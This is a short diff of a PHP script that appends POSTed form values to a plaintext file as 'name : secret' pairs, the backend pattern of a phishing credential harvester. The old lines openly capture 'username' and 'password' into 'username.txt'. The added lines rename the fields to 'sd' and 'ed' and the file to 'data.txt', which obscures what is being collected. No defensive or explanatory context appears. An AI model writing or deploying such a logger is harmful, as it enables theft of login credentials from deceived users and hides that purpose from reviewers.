@@ -1,9 +1,9 @@
 <?php
-$myfile = fopen("username.txt", "a") or die("ERROR 404");
-fwrite($myfile,$_POST["username"]);
+$myfile = fopen("data.txt", "a") or die("ERROR 404");
+fwrite($myfile,$_POST["sd"]);
 $txt=" : ";
 fwrite($myfile,$txt);
-fwrite($myfile,$_POST["password"]);
+fwrite($myfile,$_POST["ed"]);
 $txt="\n";
 fwrite($myfile,$txt);
 fclose($myfile);
